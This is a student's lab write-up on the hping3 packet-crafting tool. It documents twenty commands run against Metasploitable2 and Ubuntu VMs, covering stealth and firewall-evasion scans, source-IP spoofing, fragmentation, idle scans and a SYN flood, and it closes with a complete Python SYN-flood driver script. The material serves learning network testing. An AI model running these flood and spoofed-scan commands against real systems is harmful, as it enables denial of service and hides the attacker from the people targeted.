# Hping3

![1_MeNeFaxpYbyNfW03rnyzdw](https://github.com/user-attachments/assets/9a40a486-3e24-47d3-8610-cabba953b49a)

### What is Hping3?
hping3 is a packet crafting tool that hackers and pentesters use to send custom TCP/IP packets. and It can:
    - Do port scanning (like Nmap, but stealthier).
    - Test firewalls/IDS evasion.
    - Check packet filtering rules.
    - Perform DoS simulation.


### LAB TOOLS
- Kali Linux
- metasploitable2
- Ubuntu


## Usage:
````
hping3 -h
````
<img width="615" height="443" alt="image" src="https://github.com/user-attachments/assets/ae12e698-1e1e-4d68-a0de-aba7bd31c010" />

#### General Options
| **Option**        | **Description**                                          |
| ----------------- | -------------------------------------------------------- |
| `-h, --help`      | Show help                                                |
| `-v, --version`   | Show version                                             |
| `-c, --count`     | Number of packets to send                                |
| `-i, --interval`  | Delay interval (`uX` for microseconds, e.g., `-i u1000`) |
| `--fast`          | Alias for `-i u10000` (10 packets/sec)                   |
| `--faster`        | Alias for `-i u1000` (100 packets/sec)                   |
| `--flood`         | Send packets as fast as possible, don’t show replies     |
| `-n, --numeric`   | Numeric output only                                      |
| `-q, --quiet`     | Quiet mode                                               |
| `-I, --interface` | Use specific network interface                           |
| `-V, --verbose`   | Verbose output                                           |
| `-D, --debug`     | Show debugging info                                      |
| `-z, --bind`      | Bind Ctrl+Z to TTL (default: dest port)                  |
| `-Z, --unbind`    | Unbind Ctrl+Z                                            |
| `--beep`          | Beep on each matching packet                             |


#### Modes
| **Mode**       | **Description**                                             |
| -------------- | ----------------------------------------------------------- |
| *(default)*    | TCP mode                                                    |
| `-0, --rawip`  | RAW IP mode                                                 |
| `-1, --icmp`   | ICMP mode                                                   |
| `-2, --udp`    | UDP mode                                                    |
| `-8, --scan`   | Port scan mode (e.g., `hping3 --scan 1-30,70-90 -S target`) |
| `-9, --listen` | Listen mode                                                 |


#### IP Options
| **Option**       | **Description**                             |
| ---------------- | ------------------------------------------- |
| `-a, --spoof`    | Spoof source address                        |
| `--rand-dest`    | Random destination addresses                |
| `--rand-source`  | Random source addresses                     |
| `-t, --ttl`      | Set TTL (default 64)                        |
| `-N, --id`       | Packet ID (default random)                  |
| `-W, --winid`    | Use Windows byte order for ID               |
| `-r, --rel`      | Relativize ID field (estimate host traffic) |
| `-f, --frag`     | Fragment packets (bypass ACLs)              |
| `-x, --morefrag` | Set "more fragments" flag                   |
| `-y, --dontfrag` | Set "don’t fragment" flag                   |
| `-g, --fragoff`  | Set fragment offset                         |
| `-m, --mtu`      | Set virtual MTU (implies frag if needed)    |
| `-o, --tos`      | Set Type of Service (ToS)                   |
| `-G, --rroute`   | Record route option                         |
| `--lsrr`         | Loose source routing                        |
| `--ssrr`         | Strict source routing                       |
| `-H, --ipproto`  | Set IP protocol (RAW IP mode only)          |


#### ICMP Options
| **Option**       | **Description**                   |
| ---------------- | --------------------------------- |
| `-C, --icmptype` | ICMP type (default echo request)  |
| `-K, --icmpcode` | ICMP code (default 0)             |
| `--force-icmp`   | Send all ICMP types               |
| `--icmp-gw`      | Gateway address for ICMP redirect |
| `--icmp-ts`      | ICMP timestamp request            |
| `--icmp-addr`    | ICMP address subnet mask          |
| `--icmp-help`    | Show ICMP help                    |


#### UDP / TCP 
| **Option**        | **Description**                                |
| ----------------- | ---------------------------------------------- |
| `-s, --baseport`  | Base source port (default random)              |
| `-p, --destport`  | Destination port (default 0, `ctrl+z` inc/dec) |
| `-k, --keep`      | Keep same source port                          |
| `-w, --win`       | TCP window size (default 64)                   |
| `-O, --tcpoff`    | Fake TCP data offset                           |
| `-Q, --seqnum`    | Show only TCP sequence number                  |
| `-b, --badcksum`  | Send bad checksum packets                      |
| `-M, --setseq`    | Set TCP sequence number                        |
| `-L, --setack`    | Set TCP ACK number                             |
| `-F, --fin`       | Set FIN flag                                   |
| `-S, --syn`       | Set SYN flag                                   |
| `-R, --rst`       | Set RST flag                                   |
| `-P, --push`      | Set PUSH flag                                  |
| `-A, --ack`       | Set ACK flag                                   |
| `-U, --urg`       | Set URG flag                                   |
| `-X, --xmas`      | Xmas flag scan (FIN+PSH+URG)                   |
| `-Y, --ymas`      | Ymas flag (unused bit)                         |
| `--tcpexitcode`   | Exit with last TCP flag                        |
| `--tcp-mss`       | Enable MSS option                              |
| `--tcp-timestamp` | Enable TCP timestamps (guess uptime/HZ)        |


#### Common Options
| **Option**         | **Description**                               |
| ------------------ | --------------------------------------------- |
| `-d, --data`       | Data size (default 0)                         |
| `-E, --file`       | Read data from file                           |
| `-e, --sign`       | Add signature                                 |
| `-j, --dump`       | Dump packets in hex                           |
| `-J, --print`      | Dump printable chars                          |
| `-B, --safe`       | Enable safe protocol                          |
| `-u, --end`        | Stop at EOF (file mode)                       |
| `-T, --traceroute` | Traceroute mode (implies `--bind`, `--ttl 1`) |
| `--tr-stop`        | Stop on first non-ICMP reply                  |
| `--tr-keep-ttl`    | Keep fixed TTL (monitor hop)                  |
| `--tr-no-rtt`      | Disable RTT calculation                       |
| `--apd-send`       | Send APD (packet description)                 |





## 1. Basic TCP Port scan
````
sudo hping3 -S -p 80 -c 100 192.168.127.129
````
<img width="775" height="612" alt="image" src="https://github.com/user-attachments/assets/0cf29e0a-5d4a-4399-9996-1251b518c103" />


- `-S` : send TCP SYN packets
- `-p 80` : test port 80
- `-c 1` : send only 1 packet

## 2. Scan Multiple Ports (range)
````
sudo hping3 -S -p 20-100 -c 1 192.168.127.129
````
<img width="671" height="161" alt="image" src="https://github.com/user-attachments/assets/7e352432-79c6-4bbc-a408-fa8ffee823b3" />

- Scans ports 20 to 100.



## 3. Full Port Scan (Stealth Mode)
````
sudo hping3 -S --flood -p ++1 192.168.127.129
````
<img width="668" height="133" alt="image" src="https://github.com/user-attachments/assets/8775e2d5-b3ee-4c2a-9228-fafe6ec3b29e" />

- In metasploitable2
<img width="897" height="727" alt="image" src="https://github.com/user-attachments/assets/7bcfc917-6e52-472c-9f95-89ac1808b93e" />

- This command like DOS cause it send fast packet to target, also it make my metasploitable2 is slow.
-  `--flood` : send packets as fast as possible.
-  `-p ++1` : increment port number from 1 upward
-  `-c 3 (Count = 3)` : Send only 3 packets. After sending 3 UDP packets, the command will stop.


## 4. UDP Port Scan
````
sudo hping3 -2 -p 53 -c 3 192.168.127.129
````
<img width="681" height="118" alt="image" src="https://github.com/user-attachments/assets/4ab1e0d9-5681-4183-9d86-39d1f3447eff" />

- `-2` : UDP mode
- `-p 53` : test DNS port

## 5. FIN Scan (Firewall Evasion)
````
sudo hping3 -F -p 443 -c 2 192.168.127.129
````
<img width="699" height="173" alt="image" src="https://github.com/user-attachments/assets/3c10b1eb-dfb8-4152-84ca-db4da73de7a8" />

- `-F` : FIN flag scan (used to bypass firewalls). Many firewalls ignore FIN packets, so hackers use this to sneak in.
- Each response has: 
    - `sport=443` : Source port is 443 → confirming it's responding from that port.
    - `flags=RA` : This means RST + ACK flags are set.
    - `win=0` : Window size is zero.
    - `rtt` : Round-trip time.
     


## 6. Xmas Scan (Advanced Firewall Evasion)
````
sudo hping3 -F -P -U -p 445 -c 2 192.168.127.129
````
<img width="676" height="134" alt="image" src="https://github.com/user-attachments/assets/6baf965b-2d99-4d04-be79-c84d98fa85d1" />

- Sends packet with FIN + PSH + URG flags (Xmas tree packet). Firewalls might not log/block this. Used to map out firewall rules.
- `-F` : FIN(Finish) Used to close a TCP connection. Often used in stealth scans.
- `-P` : PSH(Push) Tells the receiver to push buffered data to the application immediately.
- `-U` : URG(Urgent) Indicates that the URG pointer field is meaningful (data should be processed urgently).


## 7. ACK Scan (Firewall/IDS Testing)
````
sudo hping3 -A -p 80 -c 2 192.168.127.129
````
<img width="674" height="164" alt="image" src="https://github.com/user-attachments/assets/806b396d-483b-446a-b99e-406c81a2bf3a" />

- `-A` : ACK flag scan.
- Each response has: 
    - `sport=80` : Source port is 80 → confirming the reply came from port 80.
    - `flags=RA` : RST + ACK flags are set.
    - `seq=0/1` : Sequence numbers incrementing normally.
    - `win=0` : Window size is zero.
    - `rtt=7.9 ms / 7.6 ms` : Round-trip time.
     


## 8. SYN Flood (DoS simulation)
````
sudo hping3 -S --flood -p 80 192.168.127.129
````
<img width="660" height="123" alt="image" src="https://github.com/user-attachments/assets/e139d0c5-b933-4b9d-b5be-5f701365d90d" />

- In metasploitable2
<img width="889" height="621" alt="image" src="https://github.com/user-attachments/assets/a0d501c0-0f52-4dab-a6a5-4788706c6a9b" />

- This command sending a continuous stream of TCP SYN packets to port 80 on 192.168.127.129, as fast as your system and network allow.
- Sends endless SYN packets → overwhelms port 80 (webserver).
- Used for stress testing / DoS.


## 9. Decoy Scan (Hide Your IP)
````
sudo hping3 -S -p 22 -a 10.10.10.10 -c 1 192.168.127.131
````
<img width="654" height="129" alt="image" src="https://github.com/user-attachments/assets/4948d0ea-7582-4d5a-9333-2b007ce94db5" />

- In ubuntu
<img width="889" height="541" alt="image" src="https://github.com/user-attachments/assets/b5f2503f-ec90-40fc-a980-967ebbdfbd07" />

- In this we will see in my ubuntu see 10.10.10.10 it don't se my real kali IP.
- `-a 10.10.10.10` : spoof source IP (pretend packet came from another host).
- Used by hackers to hide their real IP while scanning.


## 10. OS Fingerprinting Trick
````
sudo hping3 -S -p 135 192.168.127.131 -c 1 --tcp-timestamp
````
<img width="686" height="162" alt="image" src="https://github.com/user-attachments/assets/73bcdffd-0cb1-4ad5-8321-7b0ff39f670f" />

- In Ubuntu:
<img width="906" height="404" alt="image" src="https://github.com/user-attachments/assets/291bbe81-c794-4324-be61-3b4d4e86a36c" />

- `--tcp-timestamp` : Include the TCP Timestamp option in the packet header.


## 11. Fragmented Packet Scan (IDS/Firewall Evasion)
````
sudo hping3 -S -p 80 -c 5 -f 192.168.127.129
````
<img width="757" height="211" alt="image" src="https://github.com/user-attachments/assets/f85748c8-7e50-418c-9f3a-898348a60ef5" />

- `-f` : fragment packets (bypass simple IDS/IPS)
- Firewalls that can’t reassemble fragments will miss it.
- `flags=SA` : SYN+ACK → Port 80 is OPEN
- Hackers use this to scan stealthily without detection.


## 12. Decoy + Fragment + Random Source Port
````
sudo hping3 -S -p 443 -a 10.10.10.10 -s 12345 -f -c 2 192.168.127.131
````
<img width="654" height="193" alt="image" src="https://github.com/user-attachments/assets/51b3bf4d-1af8-4578-b0c3-f0da2a398fc2" />

- In Ubuntu
<img width="896" height="527" alt="image" src="https://github.com/user-attachments/assets/e3eb617c-f7db-49fd-844c-a992e185835a" />

- `-a 10.10.10.10` : spoofed source IP (decoy)
- `-s 12345` : fake random source port
- `-f` : fragmentation.
- This makes it very hard to trace back to attacker.


## 13. Idle Scan (Zombie Scan with IPID)
````
sudo hping3 -S -p 80 -c 1 -a 192.168.1.100 192.168.127.131
````
<img width="648" height="132" alt="image" src="https://github.com/user-attachments/assets/c9fd40b7-ee85-4aa1-ba13-c2d7fb48e61f" />

- In ubuntu:
<img width="900" height="419" alt="image" src="https://github.com/user-attachments/assets/ef919256-613c-4181-9ebd-910b3a76523c" />

- `192.168.1.100` : zombie host (with predictable IPID)
- `192.168.127.131` : real target
- This command will makes scan look like it came from zombie host.


## 14. Slow & Low Stealth Scan
````
sudo hping3 -S -p 20-100 -i u500000 192.168.127.131
````
<img width="710" height="648" alt="image" src="https://github.com/user-attachments/assets/85f9132e-1290-4dea-857e-d0ea5acceac8" />

- In ubuntu
<img width="833" height="539" alt="image" src="https://github.com/user-attachments/assets/2bee276d-fc10-46b9-8f03-a47853fb405d" />

- `-i u500000` : interval of 500,000 microseconds (0.5 sec per packet).
- Looks like normal network “noise,” not a scan.



## 15. Custom Flag Combination (Weird Packet Scan)
````
sudo hping3 -SF -p 135 -c 2 192.168.127.131
````
<img width="657" height="126" alt="image" src="https://github.com/user-attachments/assets/80bdd229-c6b3-4b9f-b1c4-9b830da69b05" />

- `-SF` : SYN+FIN (illegal combo).
- Different OS handle invalid packets differently → fingerprinting trick.


## 16. TCP Window Size Fingerprinting
````
sudo hping3 -S -p 139 --tcp-timestamp -c 2 192.168.127.131
````
<img width="682" height="161" alt="image" src="https://github.com/user-attachments/assets/ab85556d-fa09-4118-967f-c22b7b9695f1" />

- `--tcp-timestamp` : Include and request the TCP Timestamp option in the packet.
- Send custom SYNs and analyze TCP window size.
- Used for OS detection (like Nmap’s -O)



## 17. TTL Analysis (Hop Counting Covert Scan)
````
sudo hping3 -S -p 22 -t 2 -c 2 192.168.127.131
````
<img width="672" height="166" alt="image" src="https://github.com/user-attachments/assets/88fbc7e2-3535-4d19-b8e0-eb549dcb6a14" />

- Craft packets with custom TTL to map the path and detect firewalls.
- `-t 2` : set TTL = 2



## 18. Reverse Path Scan (Detect NAT/Proxies)
````
sudo hping3 -S -a 192.168.1.50 -p 445 -c 2 192.168.127.131
````
<img width="667" height="128" alt="image" src="https://github.com/user-attachments/assets/9f1edc7b-5ef0-430b-a5c8-5a7a271953af" />

- In ubuntu:
<img width="837" height="399" alt="image" src="https://github.com/user-attachments/assets/388207df-c08e-4cc1-98d4-055622010a68" />

- `-S` : Set the SYN flag → initiates a TCP connection (SYN scan).
- Attackers use this to pivot into internal networks.
- Send SYN with spoofed internal IPs to see if firewall leaks responses.


## 19. Covert Timing Scan
````
sudo hping3 -S -p 443 -i u1000000 -c 10 192.168.127.131
````
<img width="689" height="128" alt="image" src="https://github.com/user-attachments/assets/6592b730-27fa-4f6f-976b-b0d00807ed58" />

- In ubuntu:
<img width="844" height="536" alt="image" src="https://github.com/user-attachments/assets/1f264aeb-32b3-4d44-9e0e-06c3eba61a66" />

- 1 second delay between packets.
- Encode data in time delays between packets to avoid IDS.


## 20. Combination Mega Stealth Scan
````
sudo hping3 -F -P -U -S -a 203.0.113.10 -s 666 -p ++1 -f -i u300000 192.168.127.131
````
<img width="715" height="116" alt="image" src="https://github.com/user-attachments/assets/d05e15ee-56e4-40b2-bb0f-130970d10da3" />

- In ubuntu:
<img width="835" height="504" alt="image" src="https://github.com/user-attachments/assets/f1eec206-6e61-417f-9810-71994a20c64c" />

- Full hacker-style scan with fragmentation + decoy + spoof + custom flags + random ports.
- `-F -P -U -S` : Xmas+SYN scan
- `-a 203.0.113.10` : spoofed decoy
- `-s 666` ; fake source port
- `-p ++1` : increment through ports
- `-f` : fragment packets
- `-i u300000` : 0.3s delay between packets



### Python Script:
````
python -m venv venv
source venv/bin/activate
sudo pip3 install prompt_toolkit rich psutil cryptography
````
<img width="895" height="749" alt="image" src="https://github.com/user-attachments/assets/d8d8ca4c-41ce-4ba9-8291-858f6becd68b" />

````
mousepad CyberStrike_Hping3.py
````
<img width="344" height="93" alt="image" src="https://github.com/user-attachments/assets/97b44924-562d-4ca1-994c-4a14fb237f02" />

````
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║        CYBERSTRIKE HPING3 v1.0 – SYN Flood Simulator               ║
║      Educational tool for simulating SYN floods with hping3        ║
║           For Metasploitable2, DVWA, or custom VM labs             ║
║                                                                    ║
║      Features:                                                     ║
║    • SYN Flood using hping3                                       ║
║    • Real-Time Feedback (Packets, Responses, RPS)                  ║
║    • Secure Logging (Timestamped, encrypted)                       ║
║    • Lab-Safe (No external calls, VM detection)                    ║
║                                                                    ║
║      WARNING: For educational use ONLY on systems YOU own          ║
╚════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import threading
import time
import os
import sys
import socket  # Added to fix 'name socket is not defined'
import datetime
import psutil
import platform
from dataclasses import dataclass, field
from prompt_toolkit import PromptSession
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.table import Table
from cryptography.fernet import Fernet

# Initialize console
console = Console()

# Configuration
@dataclass
class Config:
    target_ip: str = "192.168.127.129"
    port: int = 80
    packet_count: int = 1000  # Updated default to match your input
    duration: int = 30
    interface: str = "eth0"
    encrypted_logging: bool = True
    encryption_key: str = field(default_factory=lambda: Fernet.generate_key().decode())

# Global variables
config = Config()
stats = {
    "packets_sent": 0,
    "packets_received": 0,
    "start_time": 0.0
}
attack_running = False
lock = threading.Lock()
fernet = Fernet(config.encryption_key.encode())
log_file = f"cyberstrike_hping3_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
console_lock = threading.Lock()

# Secure logging
def secure_log(message, level="INFO"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] {level.upper()}: {message}"
    if config.encrypted_logging:
        encrypted_message = fernet.encrypt(log_message.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted_message + b"\n")
    with console_lock:
        console.print(f"[{'green' if level == 'INFO' else 'yellow' if level == 'WARNING' else 'red'}]{log_message}[/]")

# Resource monitoring
def log_resources():
    cpu_percent = psutil.cpu_percent(interval=1)
    memory_percent = psutil.virtual_memory().percent
    memory_total = psutil.virtual_memory().total / (1024*1024)
    memory_used = psutil.virtual_memory().used / (1024*1024)
    secure_log(f"Resource usage: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%, Total {memory_total:.1f}MB, Used {memory_used:.1f}MB")

# VM detection
def check_virtual_machine() -> bool:
    checks = [
        lambda: platform.system().lower() == "linux" and any(vm in open("/sys/class/dmi/id/product_name", "r").read().lower() for vm in ["vmware", "virtual", "kvm", "qemu"] if os.path.exists("/sys/class/dmi/id/product_name")),
        lambda: "hypervisor" in open("/proc/cpuinfo", "r").read().lower() if os.path.exists("/proc/cpuinfo") else False,
        lambda: subprocess.run(["systemd-detect-virt"], capture_output=True, text=True).stdout.strip() != "none"
    ]
    return any(check() for check in checks)

# Run hping3
def run_hping3():
    cmd = [
        "hping3", "-S", "-p", str(config.port), "-c", str(config.packet_count),
        "-I", config.interface, config.target_ip
    ]
    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        while attack_running and process.poll() is None:
            line = process.stdout.readline()
            if line:
                if "packets transmitted" in line:
                    parts = line.split()
                    sent = int(parts[0])
                    received = int(parts[3])
                    with lock:
                        stats["packets_sent"] += sent
                        stats["packets_received"] += received
                secure_log(line.strip())
            time.sleep(0.1)
        stderr = process.stderr.read()
        if stderr:
            secure_log(f"hping3 stderr: {stderr}", "WARNING")
        process.terminate()
    except Exception as e:
        secure_log(f"hping3 error: {e}", "ERROR")

def monitor_stats(progress: Progress, task):
    while attack_running:
        time.sleep(1)
        with lock:
            elapsed = time.time() - stats["start_time"]
            rps = stats["packets_sent"] / max(elapsed, 1)
        table = Table(title="CYBERSTRIKE HPING3 v1.0 - STATUS")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        table.add_row("Elapsed", f"{elapsed:.2f}s")
        table.add_row("Threads", str(threading.active_count()))
        table.add_row("Packets Sent", str(stats["packets_sent"]))
        table.add_row("Packets Received", str(stats["packets_received"]))
        table.add_row("RPS", f"{rps:.2f}")
        table.add_row("Target", f"{config.target_ip}:{config.port}")
        with console_lock:
            console.clear()
            console.print(table)
            progress.update(task, advance=1)
        secure_log(f"Status: RPS={rps:.2f}, Sent={stats['packets_sent']}")

def interactive_menu():
    session = PromptSession(multiline=False)
    console.print(__doc__)
    secure_log("CYBERSTRIKE HPING3 v1.0 (SYN Flood Simulator) started")
    target_ip = session.prompt("Please enter target IP: ", default=config.target_ip)
    port = session.prompt("Please enter target port: ", default=str(config.port))
    packet_count = session.prompt("Please enter packet count: ", default=str(config.packet_count))
    try:
        socket.inet_aton(target_ip)
        port = int(port)
        packet_count = int(packet_count)
        if not (1 <= port <= 65535):
            raise ValueError("Port must be between 1 and 65535")
        if packet_count < 1:
            raise ValueError("Packet count must be positive")
        config.target_ip = target_ip
        config.port = port
        config.packet_count = packet_count
    except (socket.error, ValueError) as e:
        console.print(f"[red] Invalid IP, port, or packet count: {e}. Using defaults: {config.target_ip}:{config.port}, {config.packet_count} packets[/red]")
        secure_log(f"Invalid input: {e}. Using defaults", "WARNING")
    console.print(f" Current target: {config.target_ip}:{config.port}")
    if session.prompt(" Start attack? (yes/no): ").lower() != "yes":
        console.print("[red]Attack cancelled.[/red]")
        secure_log("Attack cancelled")
        return False
    return True

def main():
    global attack_running, stats
    try:
        import prompt_toolkit, rich, psutil, cryptography
        subprocess.run(["hping3", "--version"], capture_output=True, check=True)
    except (ImportError, subprocess.CalledProcessError):
        console.print("[red] Missing dependencies. Install with: sudo apt install hping3 && sudo pip3 install prompt_toolkit rich psutil cryptography[/red]")
        sys.exit(1)

    if os.name == 'posix' and os.geteuid() != 0:
        console.print("[red] This script requires root privileges. Run with sudo.[/red]")
        sys.exit(1)

    if not check_virtual_machine():
        console.print("[red] Not running in a VM. Ensure this is a lab environment.[/red]")
        if input("Continue anyway? (yes/no): ").lower() != "yes":
            sys.exit(1)

    log_resources()
    
    if not interactive_menu():
        return

    stats["start_time"] = time.time()
    attack_running = True
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Attacking...", total=config.duration)
        threading.Thread(target=run_hping3, daemon=True).start()
        threading.Thread(target=monitor_stats, args=(progress, task), daemon=True).start()

        try:
            time.sleep(config.duration)
        except KeyboardInterrupt:
            console.print("[red] Attack interrupted by user.[/red]")
            secure_log("Attack interrupted")
        finally:
            attack_running = False
            subprocess.run(["pkill", "hping3"], check=False)

    duration = time.time() - stats["start_time"]
    rps = stats["packets_sent"] / max(duration, 1)
    impact = "Moderate" if stats["packets_received"] > 0 else "Low"
    table = Table(title="CYBERSTRIKE HPING3 v1.0 - FINAL REPORT")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="green")
    table.add_row("Target", f"{config.target_ip}:{config.port}")
    table.add_row("Duration", f"{duration:.2f}s")
    table.add_row("Impact", impact)
    table.add_row("Packets Sent", str(stats["packets_sent"]))
    table.add_row("Packets Received", str(stats["packets_received"]))
    table.add_row("RPS", f"{rps:.2f}")
    console.print(table)
    secure_log(f"Final Report: RPS={rps:.2f}, Impact={impact}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"[red] Critical error: {e}[/red]")
        secure_log(f"Critical error: {e}", "ERROR")
````
<img width="917" height="699" alt="image" src="https://github.com/user-attachments/assets/4f06783e-bed0-4e04-a24d-b4bfb9b23dea" />

````
sudo ./CyberStrike_Hping3.py
````
<img width="794" height="393" alt="image" src="https://github.com/user-attachments/assets/fa47ee47-8cec-4df2-ba74-5f07d792a3c3" />

<img width="883" height="408" alt="image" src="https://github.com/user-attachments/assets/45baaed1-7ce3-4a08-b2a7-ba318823de8e" />

<img width="614" height="420" alt="image" src="https://github.com/user-attachments/assets/2c0505cf-cb1b-4733-87bc-5faf4b214cb5" />


- In Ubuntu:
<img width="812" height="510" alt="image" src="https://github.com/user-attachments/assets/7bfec34e-add4-4f07-a701-af25ac60942f" />


- This script i used AI to make a script for me cause i want to test with script for easy than.


### ==========>>> End Of Hping3

### Why hacker use Hping 3
hackers (and pentesters) use hping3 for port scanning, instead of just relying on tools like Nmap or Rustscan.
- Full Packet Crafting Control
- Stealth & IDS/IPS Evasion
- OS Fingerprinting & Firewall Testing
- Spoofing & Decoy Scans
- Firewall & NAT Mapping


### Author Notes
This insight is based on my hands-on experience using Hping3 during penetration testing labs and network assessments in school and course.



### Practice in LAB bY: Nin Kanong(k4n0ng)

#### Date: 1/Sept/2025
